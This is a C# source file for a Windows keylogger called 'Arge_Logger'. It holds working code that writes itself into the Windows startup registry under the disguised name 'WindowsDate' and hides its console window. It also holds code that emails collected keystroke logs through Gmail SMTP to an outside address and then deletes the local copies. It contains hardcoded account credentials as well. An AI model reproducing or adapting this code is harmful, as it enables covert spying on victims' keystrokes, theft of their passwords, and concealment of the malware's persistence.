using System;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;

namespace Arge_Logger
{
    static class Program
    {
        public static bool debug = false;

        static void addToStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true); 

            if (rkApp.GetValue("WindowsDate") == null)
                rkApp.SetValue("WindowsDate", Application.ExecutablePath.ToString());
     
            rkApp.Close();
        }

        static void sendMail()
        {
            try
            {
                string logFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs";
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential("bnylog@gmail.com", "15975321");
                MailMessage mm = new MailMessage();
                var files = System.IO.Directory.GetFiles(logFolder);
                foreach (var file in files)
                {
                    Attachment a = new Attachment(file);
                    mm.Attachments.Add(a);
                }
                string from = "keylogger@bunny.com";
                mm.From = new MailAddress(from);
                mm.To.Add(new MailAddress("harun@delipoyraz.net"));
                mm.Subject = "Keylogger";
                mm.Body = "Keylogs";
                client.Send(mm);
                mm.Dispose();

                foreach (var file in files)
                    System.IO.File.Delete(file);
            }
            catch
            {
            }
        }

        [STAThread]
        static void Main()
        {
            if(!debug)
                ShowWindow(FindWindow(null, Console.Title), 0);
            //taskhide th = new taskhide("WindowsDate.exe");
            //new Thread(th.hide).Start();
            //sendMail();
            //KeyLogger keylog = new KeyLogger();
            //addToStartup();
            Application.Run();
        }

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
